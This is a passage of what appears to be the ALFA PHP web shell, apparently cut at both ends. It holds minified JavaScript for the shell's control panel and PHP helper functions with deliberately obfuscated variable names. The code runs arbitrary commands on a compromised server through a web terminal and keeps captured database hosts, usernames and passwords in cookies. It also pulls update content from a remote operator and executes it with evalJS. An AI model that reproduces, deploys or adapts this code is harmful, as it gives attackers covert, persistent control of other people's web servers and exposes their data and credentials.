0!==(r=l[terminal_walk_index[a].index])?(e.value=r,++terminal_walk_index[a].index):(e.value="",terminal_walk_index[a].index=0)):terminal_walk_index[a].index<l.length&&(0==terminal_walk_index[a].key&&++terminal_walk_index[a].index,e.value=l[terminal_walk_index[a].index],++terminal_walk_index[a].index),terminal_walk_index[a].key=1;break;case 40:l=alfaGetTerminalHistory(!0);if(terminal_walk_index[a].index>=0)0!=terminal_walk_index[a].index&&(--terminal_walk_index[a].index,1==terminal_walk_index[a].key&&--terminal_walk_index[a].index),void 0!==(r=l[terminal_walk_index[a].index])?e.value=r:(e.value="",terminal_walk_index[a].index=0);terminal_walk_index[a].key=0;break;default:console.log(i.keyCode)}else terminal_walk_index[a].index=0}function clearTerminalHistory(){d.querySelectorAll(".commands-history").forEach(function(e){e.innerHTML=""}),setCookie("alfa-terminal-history","",2012)}function alfaAceToFullscreen(e){var t=e.getAttribute("ace_id");alfa_ace_editors.editor[t].container.requestFullscreen()}function closeHistoryCmd(e,t){if("free"==e){var a=t.getAttribute("term_id");return e=d.querySelector("#"+a+" .cmd-history-icon"),d.querySelector("#"+a+" .cmd-history-holder").style.visibility="hidden",d.querySelector("#"+a+" .cmd-history-holder").style.opacity="0",e.setAttribute("mode","off"),!1}var i=e.getAttribute("mode"),l=(a=e.getAttribute("term_id"),d.querySelector("#"+a+" .cmd-history-holder"));0==i.length||"off"==i?(l.style.visibility="visible",l.style.opacity="1",e.setAttribute("mode","on")):(l.style.visibility="hidden",l.style.opacity="0",e.setAttribute("mode","off"))}function geEvalAceValue(e){var t=e.querySelector(".php-evals-ace").getAttribute("id");return alfa_ace_editors.eval[t].getValue()}function alfaOpenArchive(e){var t=e.getAttribute("path"),a=e.getAttribute("fname"),i=e.getAttribute("base_id");if(".."==a&&"phar://"!=t.substr(0,7))return!1;var l="a="+alfab64("open_archive_dir")+"&c="+alfab64(c_)+"&alfa1="+alfab64(t)+"&alfa2="+alfab64(i)+"&ajax="+alfab64("true");_Ajax(d.URL,l,function(e){if("0"!=e){$("archive_base_"+i).innerHTML=e;var a=$("archive_dir_"+i).getAttribute("archive_name"),l=$("archive_dir_"+i).getAttribute("archive_full"),r="",o="";if(0!=(t=t.split(a)[1]).length){var n=(t=t.split("/")).length-1;for(var s in 0==t[n].length&&t.splice(n,1),t)0!=t.length&&(o+=t[s]+"/",r+='<a base_id="'+i+'" fname="'+t[s]+'" path="'+l+o+'" onclick="alfaOpenArchive(this);">'+t[s]+"/</a>")}d.querySelector("#archive_dir_"+i+" .archive_pwd_holder").innerHTML=r}},!1,"open_archive_dir")}function alfaDeleteConnectToDb(e){d.querySelectorAll(".dbh_"+e).forEach(function(e){e.remove()}),alfaConnectionHistoryUpdate(e)}function alfaConnectToDb(e,t){var a={};try{a=JSON.parse(atob(getCookie("alfa_connection_hist")))}catch(e){}var i=d.querySelector("#"+t+" div.sf");i.querySelector("input[name=sql_host]").value=a[e].host,i.querySelector("input[name=sql_login]").value=a[e].user,i.querySelector("input[name=sql_pass]").value=a[e].pass,(i.querySelector("input[name=sql_base]")?i.querySelector("input[name=sql_base]"):i.querySelector("select[name=sql_base]")).value=a[e].db,i.querySelector("input[name=sql_count]").checked=!0,d.querySelector("#"+t+" div.sf .db-connect-btn").click()}function alfaShowConnectionHistory(e){var t={},a=e.getAttribute("db_id"),i=e.getAttribute("mode");if(rows='<table class="connection-hist-table"><tr><th>*</th><th>Host</th><th>User</th><th>Pass</th><th>Database</th><th>Connect</th><th>Delete</th></tr>',"on"==i){e.setAttribute("mode","off");try{t=JSON.parse(atob(getCookie("alfa_connection_hist")))}catch(e){}var l,r=1;for(l in t){var o=t[l].user+"_"+t[l].db;rows+='<tr class="dbh_'+o+'"><th>'+r+"</th><th>"+t[l].host+"</th><th>"+t[l].user+"</th><th>"+t[l].pass+"</th><th>"+t[l].db+'</th><th><button style="margin: unset;" class="connection-his-btn" onclick=\'alfaConnectToDb("'+o+'","'+a+'");\'>Connect</button></th><th style="text-align: center;"><button style="margin: unset;" class="connection-his-btn connection-delete" onclick=\'alfaDeleteConnectToDb("'+o+"\");'>X</button></th></tr>",r++}rows+="</table"}else e.setAttribute("mode","on"),rows="";d.querySelector("#"+a+" .connection_history_holder").innerHTML=rows}function alfaConnectionHistoryUpdate(e){var t,a={};try{a=JSON.parse(atob(getCookie("alfa_connection_hist")))}catch(e){}for(t in mysql_cache)0!=mysql_cache[t].db.length&&(a[mysql_cache[t].user+"_"+mysql_cache[t].db]=mysql_cache[t]);void 0!==e&&delete a[e],setCookie("alfa_connection_hist",btoa(JSON.stringify(a)),2012)}function alfaExecTerminal(e,t){var a="";if(0==(a=void 0!==t?"cd "+c_:e.c.value).length)return!1;"l"==a?a="ls -trh --color":"ll"==a&&(a="ls -ltrh --color");var i=e.getAttribute("term_id");alfaloader(i,"block"),closeHistoryCmd("free",e);var l="";"FORM"==e.tagName&&(l=e.querySelector(".php-terminal-current-dir").innerHTML),0==(l=l.trim()).length&&(l=c_);var r="a="+alfab64("terminalExec")+"&c="+alfab64(l)+"&alfa1="+alfab64(a)+"&ajax="+alfab64("true");if(_Ajax(d.URL,r,function(e,t){alfaloader(t,"none");try{var a=$("tab_"+i);null!=a&&((-1==a.classList.value.indexOf("active-terminal-tab")||cgi_is_minimized)&&(a.classList.add("tab-is-done"),alfaShowNotification("proccess is done...",a.innerText)),cgi_is_minimized&&alfaUpdateOptionsBadge("cgiloader"))}catch(e){}e=JSON.parse(e),d.querySelector("#"+t+" .php-terminal-output > pre").innerHTML=e.output,0!=e.path.length&&(d.querySelector("#"+t+" .php-terminal-current-dir").innerHTML=e.path)},!1,i),void 0===t){d.querySelector("#"+i+" .cmd-history-holder .commands-history").insertAdjacentHTML("afterbegin","<div onclick=\"d.querySelector('#"+i+' .php-terminal-input\').value = this.innerHTML;" class="history-cmd-line">'+a+"</div>");var o=alfaGetTerminalHistory(),n=o.indexOf(a);-1!=n&&o.splice(n,1),o.push(a),setCookie("alfa-terminal-history",btoa(JSON.stringify(o)),2012)}d.querySelector("#"+i+" input.php-terminal-input").focus()}function pageChangedFilesMan(e){var t="filesman_holder_"+alfa_current_fm_id,a=getCookie(t+"_page_number"),i=e.innerText;if("<<"==i){a=d.querySelector("#"+t+" .active-page-number").innerText;if(!((a=parseInt(a))>1))return!1;i=a-1}if(">>"==i){a=d.querySelector("#"+t+" .active-page-number").innerText;a=parseInt(a);var l=d.querySelector("#"+t+" .last-page-number").innerHTML;if(!(a+1<=(l=parseInt(l))))return!1;i=a+1}setCookie(t+"_page_number",i,2012),g("FilesMan",c_)}function alfaColDumperInit(){var e=d.querySelector(".tab_name.tab_is_active").getAttribute("opt_id"),t=d.querySelector("#"+e),a=t.getElementsByClassName("box");for(i=0;i<a.length;i++)a[i].addEventListener("click",function(){null!=this.parentElement.querySelector(".nested")&&(this.parentElement.querySelector(".nested").classList.toggle("active"),this.classList.toggle("check-box"))});var i;a=t.getElementsByClassName("sub-box");for(i=0;i<a.length;i++)a[i].setAttribute("opt_id",e),a[i].addEventListener("click",function(){this.classList.toggle("check-box");var e=this.getAttribute("tbl"),t=this.getAttribute("opt_id");t=t.replace("option_",""),col_dumper_selected_data.hasOwnProperty(t)||(col_dumper_selected_data[t]={}),void 0===col_dumper_selected_data[t][e]&&(col_dumper_selected_data[t][e]=[]);var a=this.innerHTML,i=col_dumper_selected_data[t][e].indexOf(a);-1==i?col_dumper_selected_data[t][e].push(a):col_dumper_selected_data[t][e].splice(i,1)})}function showSymlinkPath(e,t){t.stopPropagation();var a=e.getAttribute("row"),i=$("td_row_"+a),l=e.getAttribute("opt_title"),r=e.getAttribute("fname");if(l=decodeURIComponent(r)+" -> "+l,null!=i){i.insertAdjacentHTML("afterbegin",'<div class="symlink_path" id="link_id_'+a+'">'+l+"</div>");var o=t.clientX,n=t.clientY-30;$("link_id_"+a).style.left=o+"px",$("link_id_"+a).style.top=n+"px"}}function hideSymlinkPath(e,t){t.stopPropagation(),$("link_id_"+e.getAttribute("row")).remove()}function alfagetFlags(){data="a="+alfab64("get_flags")+"&c="+alfab64(c_)+"&ajax="+alfab64("true"),_Ajax(d.URL,data,function(e){var t=JSON.parse(e);t.hasOwnProperty("server")&&(d.querySelectorAll(".flag-holder")[0].innerHTML='<img draggable="false" title="'+t.server.name+'" src="http://solevisible.com/images/flags/48/'+t.server.code.toLowerCase()+'.png">',d.querySelectorAll(".flag-holder")[0].style.display="inline"),t.hasOwnProperty("client")&&(d.querySelectorAll(".flag-holder")[1].innerHTML='<img draggable="false" title="'+t.client.name+'" src="http://solevisible.com/images/flags/48/'+t.client.code.toLowerCase()+'.png">',d.querySelectorAll(".flag-holder")[1].style.display="inline")})}function colDumplerSelectType(e){var t=e.options[e.selectedIndex].value;$("coldumper-delimiter-input").style.display="delimiter"==t?"inline-block":"none"}function alfaCheckUrlHash(){var e=window.location.hash.substr(1),t=e.split("&").reduce(function(e,t){var a=t.split("=");return e[a[0]]=a[1],e},{});if(""!=e)switch(t.action){case"fileman":case"options":t.path=decodeURIComponent(t.path),g("FilesMan",t.path,function(e){if(t.hasOwnProperty("file")){var a="auto";isArchive(t.file)&&(a="view"),editor(t.path+"/"+t.file,a,"","","","file")}}),"options"==t.action&&t.hasOwnProperty("opt")&&(alfa_can_add_opt=!0,g(t.opt,null,"","",""),d.querySelector(".opt-title").innerHTML=$("menu_opt_"+t.opt).innerHTML),t.hasOwnProperty("file")||editorClose("editor"),t.hasOwnProperty("opt")||editorClose("options_window"),editorClose("cgiloader");break;default:g("FilesMan","<?php echo $GLOBALS["cwd"]; ?>"),editorClose("editor"),editorClose("options_window"),editorClose("cgiloader")}else g("FilesMan","<?php echo $GLOBALS["cwd"]; ?>"),editorClose("editor"),editorClose("options_window"),editorClose("cgiloader")}function alfaFmngrContextRow(){d.querySelectorAll(".fmanager-row a.main_name").forEach(function(e){e.addEventListener("contextmenu",function(e){var t=e.target,a="";if(".."==(a="A"==e.target.parentElement.tagName?(t=e.target.parentElement).getAttribute("fname"):t.getAttribute("fname")))return!1;var i=t.getAttribute("id"),l=t.getAttribute("path"),r=t.getAttribute("ftype"),o=["newtab","link","download","view","edit","move","copy","rename","modify","permission","compress","extract","delete"];for(var n in"file"!=r||isArchive(a)?o[3]="view_archive":o.splice(11,1),"folder"==r&&(o=["newtab","link","move","copy","rename","modify","permission","compress","delete"]),alfaSortMenuItems(o),o){var s=d.querySelector("#rightclick_menu > a[name="+o[n]+"]");switch(s.setAttribute("fid",i),s.setAttribute("fname",decodeURIComponent(a)),s.setAttribute("path",l),s.setAttribute("ftype",r),o[n]){case"view":case"edit":var c="auto";"edit"==o[n]&&(c="edit"),s.setAttribute("href","#action=fileman&path="+c_+"/&file="+a),s.setAttribute("onclick","editor('"+a+"','"+c+"','','','','file')");break;case"newtab":var u=a;"file"==r?(u="&file="+a,s.setAttribute("href","#action=fileman&path="+c_+"/"+u),s.setAttribute("target","_blank"),s.onclick=function(){}):(s.setAttribute("href","javascript:void(0)"),s.removeAttribute("target"),s.onclick=function(){alfaFilesManNewTab(c_,u)});break;case"delete":s.setAttribute("onclick","var chk = confirm('Are You Sure For Delete # "+a+" # ?'); chk ? g('FilesMan',null,'delete', '"+a+"') : '';");break;case"download":s.setAttribute("onclick","g('FilesTools',null,'"+a+"', 'download')");break;case"permission":try{var p=d.querySelector("#id_chmode_"+i.replace("id_","")+" span").innerHTML;s.setAttribute("perm",p.trim())}catch(e){}break;case"link":s.style.display="block";var f="<?php echo $_SERVER["DOCUMENT_ROOT"]; ?>/",m=(c_+"/"+a).replace(/\/\//g,"/");if(-1!=m.indexOf(f)){f=m.replace(f,"");var b=location.origin+"/"+f;s.setAttribute("href",""+b)}else s.style.display="none"}}var y=e.clientX,_=e.clientY;alfaRightClickMenu(y,_),e.preventDefault()})})}function alfaFilesManNewTab(e,t,a){var i=t;void 0!==a&&(i=alfaGetLastFolderName(e));var l=decodeURIComponent(e+"/"+t);l=l.replace(/\/\//g,"/");var r=$("filesman_tab_1"),o=r.getAttribute("fm_counter");o=parseInt(o)+1,r.setAttribute("fm_counter",o),d.querySelector("#filesman_tabs_child").insertAdjacentHTML("beforeend",'<div onmouseover="alfaFilesmanTabShowTitle(this,event);" onmouseout="alfaFilesmanTabHideTitle(this,event);" path="'+l+'" id="filesman_tab_'+o+'" fm_id="'+o+'" onclick="filesmanTabController(this);" fname="'+t+'" class="filesman_tab"><img class="folder-tab-icon" src="http://solevisible.com/icons/menu/folder2.svg"> <span class="filesman-tab-folder-name">'+i+'</span> <img fm_id="'+o+'" onclick="closeFmTab(this,event);return false;" title="[close]" src="http://solevisible.com/icons/menu/delete.svg"></div>'),d.querySelector(".ajaxarea").insertAdjacentHTML("beforebegin",'<div style="position:relative;" fm_id="'+o+'" id="filesman_holder_'+o+'" class="ajaxarea"><div class="header"></div></div>'),alfa_fm_id=o,g("FilesMan",l),alfa_fm_id=0}function alfaFilesmanTabShowTitle(e,t){t.stopPropagation();var a=$("filesman-tab-full-path");a.style.display="block",a.style.top=e.offsetTop-37+"px",a.style.left=e.offsetLeft-$("filesman_tabs").scrollLeft+"px",a.innerHTML=e.getAttribute("path")}function alfaFilesmanTabHideTitle(e,t){$("filesman-tab-full-path").style.display="none"}function alfaPopupAction(e,t){var a="",i="";switch(t){case"rename":a="Old file name:",i="New file name:";break;case"copy":a="File path:",i="Enter the file path that you want to copy this file to:";break;case"move":a="Current Path:",i="Enter the file path that you want to move this file to:";break;case"extract":a="Files to extract:",i="Enter the path you wish to extract the files to and click Extract:"}var l=e.getAttribute("fname"),r=e.getAttribute("path"),o=t.charAt(0).toUpperCase()+t.slice(1);if("permission"==t){d.querySelector("#shortcutMenu-holder").style.height="222px",o="Change Permissions",d.querySelector("#shortcutMenu-holder > form > .perm-table-holder").style.display="block",d.querySelector("#shortcutMenu-holder > form > input[name=fname]").style.display="none";var n=e.getAttribute("perm"),s=n.substr(1,1),c=n.substr(2,1),u=n.substr(3,1);d.querySelector("#shortcutMenu-holder > form input[name=u]").value=s,d.querySelector("#shortcutMenu-holder > form input[name=g]").value=c,d.querySelector("#shortcutMenu-holder > form input[name=w]").value=u,autoCheckPerms(s,"u",["u","g","w"]),autoCheckPerms(c,"g"),autoCheckPerms(u,"w")}else d.querySelector("#shortcutMenu-holder").style.height="190px",d.querySelector("#shortcutMenu-holder > form > input[name=fname]").style.display="block",d.querySelector("#shortcutMenu-holder > form > .perm-table-holder").style.display="none";var p="move"==t||"copy"==t?r+l:l;if("modify"==t){var f="tr_row_"+e.getAttribute("fid").replace("id_","");p=d.querySelector("#"+f+" .main_modify").innerText}d.querySelector(".cl-popup-fixed").style.display="block",d.querySelector("#shortcutMenu-holder .popup-head").innerHTML=o,d.querySelector("#shortcutMenu-holder .old-path-lbl").innerHTML=a,d.querySelector("#shortcutMenu-holder .new-filename-lbl").innerHTML=i,d.querySelector("#shortcutMenu-holder .popup-foot > button[name=accept]").innerHTML=o,d.querySelector("#shortcutMenu-holder > form > .old-path-content").innerHTML=r+l,d.querySelector("#shortcutMenu-holder > form > input[name=fname]").value=p,d.querySelector("#shortcutMenu-holder button[name=accept]").setAttribute("fid",e.getAttribute("fid")),d.querySelector("#shortcutMenu-holder button[name=accept]").setAttribute("action",t)}function calcperm(){var e=event.srcElement;autoCheckPerms(e.checked,e.name.substr(0,1))}function autoCheckPerms(e,t,a){if(void 0!==a)for(var i in a){var l=a[i];d.querySelector("#shortcutMenu-holder > form input[name="+l+"r]").checked=!1,d.querySelector("#shortcutMenu-holder > form input[name="+l+"w]").checked=!1,d.querySelector("#shortcutMenu-holder > form input[name="+l+"x]").checked=!1}var r=d.querySelector("#shortcutMenu-holder > form input[name="+t+"r]"),o=d.querySelector("#shortcutMenu-holder > form input[name="+t+"w]"),n=d.querySelector("#shortcutMenu-holder > form input[name="+t+"x]");if("boolean"!=typeof e)"7"==e?(r.checked=!0,o.checked=!0,n.checked=!0):"4"==e?r.checked=!0:"2"==e?o.checked=!0:"1"==e?n.checked=!0:"6"==e?(r.checked=!0,o.checked=!0):"3"==e?(o.checked=!0,n.checked=!0):"5"==e&&(r.checked=!0,n.checked=!0);else{var s=0;r.checked&&(s+=4),o.checked&&(s+=2),n.checked&&(s+=1),"u"==t?d.querySelector("#shortcutMenu-holder > form input[name=u]").value=s:"g"==t?d.querySelector("#shortcutMenu-holder > form input[name=g]").value=s:"w"==t&&(d.querySelector("#shortcutMenu-holder > form input[name=w]").value=s)}}function gg(e,t,a,i,l,r){var o="filesman_holder_"+alfa_current_fm_id;alfaloader(o,"block"),data="a="+alfab64(e)+"&c="+alfab64(t)+"&alfa1="+alfab64(a)+"&alfa2="+alfab64(i)+"&alfa3="+alfab64(l)+"&ajax="+alfab64("true"),_Ajax(d.URL,data,r,!1,o)}function alfaPopUpDoAction(e){var t=e.getAttribute("action");switch(t){case"rename":case"move":case"copy":var a=e.getAttribute("fid").replace("id_",""),i=$("id_"+a).getAttribute("fname"),l=d.querySelector("#shortcutMenu-holder > form > input[name=fname]").value;l=l.trim(),i=i.trim(),gg("doActions",c_,i,l,t,function(e,i){if("rename"==t)if("done"==e){var r=$("id_"+a);updateFileEditor(a,l);var o=r.getAttribute("path")+$("id_"+a).getAttribute("fname");d.querySelector("#shortcutMenu-holder > form > .old-path-content").innerHTML=o,r.addEventListener("animationend",function(){r.classList.remove("textEffect")}),r.classList.add("textEffect"),alfaShowNotification("Renamed...","Rename Action"),d.querySelector(".cl-popup-fixed").style.display="none"}else alfaShowNotification("error...!","Rename Action","error");alfaloader(i,"none")});break;case"permission":var r=d.querySelector("#shortcutMenu-holder > form input[name=u]").value,o=d.querySelector("#shortcutMenu-holder > form input[name=g]").value,n=d.querySelector("#shortcutMenu-holder > form input[name=w]").value;i=(i=d.querySelector("#shortcutMenu-holder > form > .old-path-content").innerHTML).trim();var s=r.trim()+o.trim()+n.trim();gg("doActions",c_,i,s,t,function(e,t){alfaloader(t,"none"),alfaShowNotification(e,"Permission Action"),d.querySelector(".cl-popup-fixed").style.display="none"});break;case"modify":a=e.getAttribute("fid").replace("id_","");var c=d.querySelector("#shortcutMenu-holder > form > input[name=fname]").value,u=$("id_"+a).getAttribute("fname");gg("doActions",c_,c,u,t,function(t,a){if("ok"==t){var i="tr_row_"+e.getAttribute("fid").replace("id_","");d.querySelector("#"+i+" .main_modify").innerHTML=c,alfaShowNotification("success...","Modify Action"),d.querySelector(".cl-popup-fixed").style.display="none"}else alfaShowNotification(t,"Modify Action","error");alfaloader(a,"none")})}}function alfaInitSoratableTab(e){Sortable.create(e,{direction:"horizontal",animation:300,ghostClass:"sortable-ghost",filter:".not-sortable"})}$("search-input").addEventListener("keydown",function(e){setTimeout(function(){var e=$("search-input").value;for(var t in d.getElementsByClassName("history-list")[0].innerHTML="",editor_files)if(-1!=editor_files[t].file.search(e)||""==e){var a=0;t==editor_current_file&&(a=" is_active"),insertToHistory(t,editor_files[t].file,a,editor_files[t].type)}},100)},!1),_Ajax(d.URL,"a="+alfab64("checkupdate"),function(e){if(0!=e.length&&"[]"!=e){var t=JSON.parse(e);if(t.hasOwnProperty("content")){d.body.insertAdjacentHTML("beforeend",t.content);try{evalJS(t.content)}catch(t){}}if(t.hasOwnProperty("copyright")&&($("alfa-copyright").innerHTML=t.copyright),t.hasOwnProperty("solevisible")&&($("alfa_solevisible").innerHTML=t.solevisible),t.hasOwnProperty("code_name")&&($("hidden_sh").innerHTML=t.code_name.replace(/\{version\}/g,t.version_number)),t.hasOwnProperty("market")){var a=d.querySelector("span.alfa_plus");if(t.market.hasOwnProperty("visible")&&"yes"==t.market.visible&&($("menu_opt_market").style.display="inline"),"open"!=t.market.status&&(a.style.color="#ffc107"),t.market.hasOwnProperty("content"))try{evalJS(t.market.content)}catch(t){}}}}),<?php echo $GLOBALS["need_to_update_header"]; ?>?_Ajax(d.URL,"a="+alfab64("updateheader"),function(e){try{var t=JSON.parse(e);for(var a in t){for(var i="",l=0;l<t[a].length;l++)i+="useful"==a||"downloader"==a?'<span class="header_values" style="margin-left: 4px;">'+t[a][l]+"</span>":t[a][l];var r=$("header_"+a);r&&(r.innerHTML=i)}$("header_cgishell").innerHTML="ON",$("header_cgishell").setAttribute("class","header_on")}catch(e){}}):islinux&&_Ajax(d.URL,"a="+alfab64("checkcgi"),function(e){"ok"==e&&($("header_cgishell").innerHTML="ON",$("header_cgishell").setAttribute("class","header_on"))}),function(){d.onclick=function(){can_hashchange_work=!1,setTimeout(function(){can_hashchange_work=!0},600)},window.onhashchange=function(e){can_hashchange_work&&alfaCheckUrlHash()},alfaCheckUrlHash(),alfagetFlags(),rightclick_menu_context=$("rightclick_menu").style,alfaInitCwdContext(),document.addEventListener("click",function(e){rightclick_menu_context.opacity="0",setTimeout(function(){rightclick_menu_context.visibility="hidden"},501)},!1);var e=document.createElement("script");e.src="https://cdnjs.cloudflare.com/ajax/libs/Sortable/1.10.2/Sortable.min.js",e.id="sortable-plugin",e.onload=function(){alfaInitSoratableTab($("filesman_tabs_child")),alfaInitSoratableTab(d.querySelector(".editor-tabs")),alfaInitSoratableTab(d.querySelector(".options_tab")),alfaInitSoratableTab(d.querySelector(".terminal-tabs")),alfaInitSoratableTab(d.querySelector(".sql-tabs"))},d.body.appendChild(e)}();
</script>
</body>
</html>
<?php }}
if (!function_exists("posix_getpwuid") && (strpos(@ini_get('disable_functions'), 'posix_getpwuid')===false)) {
function posix_getpwuid($fxuvmwpb83878c91171338902e0fe0fb97a8c47a) {return false;} }
if (!function_exists("posix_getgrgid") && (strpos(@ini_get('disable_functions'), 'posix_getgrgid')===false)) {
function posix_getgrgid($fxuvmwpb83878c91171338902e0fe0fb97a8c47a) {return false;} }
function alfaWhich($fxuvmwpb83878c91171338902e0fe0fb97a8c47a) {
$jwzcflrpd6fe1d0be6347b8ef2427fa629c04485 = alfaEx('which ' . $fxuvmwpb83878c91171338902e0fe0fb97a8c47a,false,false);
if(!empty($jwzcflrpd6fe1d0be6347b8ef2427fa629c04485))
return strlen($jwzcflrpd6fe1d0be6347b8ef2427fa629c04485);
return false;
}
function alfaSize($fwekvgvg03c7c0ace395d80182db07ae2c30f034) {
if($fwekvgvg03c7c0ace395d80182db07ae2c30f034 >= 1073741824)
return sprintf('%1.2f', $fwekvgvg03c7c0ace395d80182db07ae2c30f034 / 1073741824 ). ' GB';
elseif($fwekvgvg03c7c0ace395d80182db07ae2c30f034 >= 1048576)
return sprintf('%1.2f', $fwekvgvg03c7c0ace395d80182db07ae2c30f034 / 1048576 ) . ' MB';
elseif($fwekvgvg03c7c0ace395d80182db07ae2c30f034 >= 1024)
return sprintf('%1.2f', $fwekvgvg03c7c0ace395d80182db07ae2c30f034 / 1024 ) . ' KB';
else
return $fwekvgvg03c7c0ace395d80182db07ae2c30f034 . ' B';
}
function alfaPerms($fxuvmwpb83878c91171338902e0fe0fb97a8c47a) {
if (($fxuvmwpb83878c91171338902e0fe0fb97a8c47a & 0xC000) == 0xC000)$brcjlegv865c0c0b4ab0e063e5caa3387c1a8741 = 's​';
elseif (($fxuvmwpb83878c91171338902e0fe0fb97a8c47a & 0xA000) == 0xA000)$brcjlegv865c0c0b4ab0e063e5caa3387c1a8741 = 'l​';
elseif (($fxuvmwpb83878c91171338902e0fe0fb97a8c47a & 0x8000) == 0x8000)$brcjlegv865c0c0b4ab0e063e5caa3387c1a8741 = '-​';
elseif (($fxuvmwpb83878c91171338902e0fe0fb97a8c47a & 0x6000) == 0x6000)$brcjlegv865c0c0b4ab0e063e5caa3387c1a8741 = 'b​';
elseif (($fxuvmwpb83878c91171338902e0fe0fb97a8c47a & 0x4000) == 0x4000)$brcjlegv865c0c0b4ab0e063e5caa3387c1a8741 = 'd​';
elseif (($fxuvmwpb83878c91171338902e0fe0fb97a8c47a & 0x2000) == 0x2000)$brcjlegv865c0c0b4ab0e063e5caa3387c1a8741 = 'c​';
elseif (($fxuvmwpb83878c91171338902e0fe0fb97a8c47a & 0x1000) == 0x1000)$brcjlegv865c0c0b4ab0e063e5caa3387c1a8741 = 'p​';
else $brcjlegv865c0c0b4ab0e063e5caa3387c1a8741 = 'u​';
$brcjlegv865c0c0b4ab0e063e5caa3387c1a8741 .= (($fxuvmwpb83878c91171338902e0fe0fb97a8c47a & 0x0100) ? 'r​' : '-');
$brcjlegv865c0c0b4ab0e063e5caa3387c1a8741 .= (($fxuvmwpb83878c91171338902e0fe0fb97a8c47a & 0x0080) ? 'w​' : '-');
$brcjlegv865c0c0b4ab0e063e5caa3387c1a8741 .= (($fxuvmwpb83878c91171338902e0fe0fb97a8c47a & 0x0040) ? (($fxuvmwpb83878c91171338902e0fe0fb97a8c47a & 0x0800) ? 's​' : 'x​' ) : (($fxuvmwpb83878c91171338902e0fe0fb97a8c47a & 0x0800) ? 'S​' : '-'));
$brcjlegv865c0c0b4ab0e063e5caa3387c1a8741 .= (($fxuvmwpb83878c91171338902e0fe0fb97a8c47a & 0x0020) ? 'r​' : '-');
$brcjlegv865c0c0b4ab0e063e5caa3387c1a8741 .= (($fxuvmwpb83878c91171338902e0fe0fb97a8c47a & 0x0010) ? 'w​' : '-');
$brcjlegv865c0c0b4ab0e063e5caa3387c1a8741 .= (($fxuvmwpb83878c91171338902e0fe0fb97a8c47a & 0x0008) ? (($fxuvmwpb83878c91171338902e0fe0fb97a8c47a & 0x0400) ? 's​' : 'x​' ) : (($fxuvmwpb83878c91171338902e0fe0fb97a8c47a & 0x0400) ? 'S​' : '-'));
$brcjlegv865c0c0b4ab0e063e5caa3387c1a8741 .= (($fxuvmwpb83878c91171338902e0fe0fb97a8c47a & 0x0004) ? 'r​' : '-');
$brcjlegv865c0c0b4ab0e063e5caa3387c1a8741 .= (($fxuvmwpb83878c91171338902e0fe0fb97a8c47a & 0x0002) ? 'w​' : '-');
$brcjlegv865c0c0b4ab0e063e5caa3387c1a8741 .= (($fxuvmwpb83878c91171338902e0fe0fb97a8c47a & 0x0001) ? (($fxuvmwpb83878c91171338902e0fe0fb97a8c47a & 0x0200) ? 't​' : 'x​' ) : (($fxuvmwpb83878c91171338902e0fe0fb97a8c47a & 0x0200) ? 'T​' : '-'));
return $brcjlegv865c0c0b4ab0e063e5caa3387c1a8741;
}
function alfaPermsColor($npviloqa8fa14cdd754f91cc6554c9e71929cce7,$oonpoqrw6f9a1cfe95f618ee5aa1c727f01ed6f4=false){
$xidctbyra2f2ed4f8ebc2cbb4c21a29dc40ab61d = "";
$mzomhdvt0fc3cfbc27e91ea60a787de13dae3e3c = "";
$kublywwm99e9bae675b12967251c175696f00a70 = "";
if($oonpoqrw6f9a1cfe95f618ee5aa1c727f01ed6f4){
$xidctbyra2f2ed4f8ebc2cbb4c21a29dc40ab61d = $npviloqa8fa14cdd754f91cc6554c9e71929cce7["class"];
$mzomhdvt0fc3cfbc27e91ea60a787de13dae3e3c = $npviloqa8fa14cdd754f91cc6554c9e71929cce7["num"];
$kublywwm99e9bae675b12967251c175696f00a70 = $npviloqa8fa14cdd754f91cc6554c9e71929cce7["human"];
}else{
$mzomhdvt0fc3cfbc27e91ea60a787de13dae3e3c = substr(sprintf('%o', @fileperms($npviloqa8fa14cdd754f91cc6554c9e71929cce7)),-4);
$kublywwm99e9bae675b12967251c175696f00a70 = alfaPerms(@fileperms($npviloqa8fa14cdd754f91cc6554c9e71929cce7));
if(!@is_readable($npviloqa8fa14cdd754f91cc6554c9e71929cce7))
$xidctbyra2f2ed4f8ebc2cbb4c21a29dc40ab61d = "main_red_perm";
elseif (!@is_writable($npviloqa8fa14cdd754f91cc6554c9e71929cce7))
$xidctbyra2f2ed4f8ebc2cbb4c21a29dc40ab61d = "main_white_perm";
else
$xidctbyra2f2ed4f8ebc2cbb4c21a29dc40ab61d = "main_green_perm";
}
return '<span style="font-weight:unset;" class="'.$xidctbyra2f2ed4f8ebc2cbb4c21a29dc40ab61d.'">'.$mzomhdvt0fc3cfbc27e91ea60a787de13dae3e3c.'</span><span style="font-weight:unset;" class="beetween_perms"> >> </span><span style="font-weight:unset;" class="'.$xidctbyra2f2ed4f8ebc2cbb4c21a29dc40ab61d.'">'.$kublywwm99e9bae675b12967251c175696f00a70.'</span>';
}
if(!function_exists("scandir")) {
function scandir($ofvepnxk736007832d2167baaae763fd3a3f3cf1) {
$qwysgjpm700f6fa0edb608ee5cc3cfa63f1c94cc = opendir($ofvepnxk736007832d2167baaae763fd3a3f3cf1);
while (false !== ($ydojshxa435ed7e9f07f740abf511a62c00eef6e = readdir($qwysgjpm700f6fa0edb608ee5cc3cfa63f1c94cc)))
$blhbqzcb45b963397aa40d4a0063e0d85e4fe7a1[] = $ydojshxa435ed7e9f07f740abf511a62c00eef6e;
return $blhbqzcb45b963397aa40d4a0063e0d85e4fe7a1;
}
}
function reArrayFiles($zxmbbootfcd7c3d68f3a011af28550aad9ca44a4){
$qfsqfqhdd303f5630eca273e4e8b7b7a5a602f50 = array();
$ikrgolej287f62860660cd88bef7f55c281fa53b = count($zxmbbootfcd7c3d68f3a011af28550aad9ca44a4['name']);
$rggtkmrg5b25659ed7bed024f2cd7a1f57e6f2ac = array_keys($zxmbbootfcd7c3d68f3a011af28550aad9ca44a4);
for ($brcjlegv865c0c0b4ab0e063e5caa3387c1a8741=0; $brcjlegv865c0c0b4ab0e063e5caa3387c1a8741<$ikrgolej287f62860660cd88bef7f55c281fa53b; $brcjlegv865c0c0b4ab0e063e5caa3387c1a8741++) {
foreach ($rggtkmrg5b25659ed7bed024f2cd7a1f57e6f2ac as $ybzpthgq3c6e0b8a9c15224a8228b9a98ca1531d) {
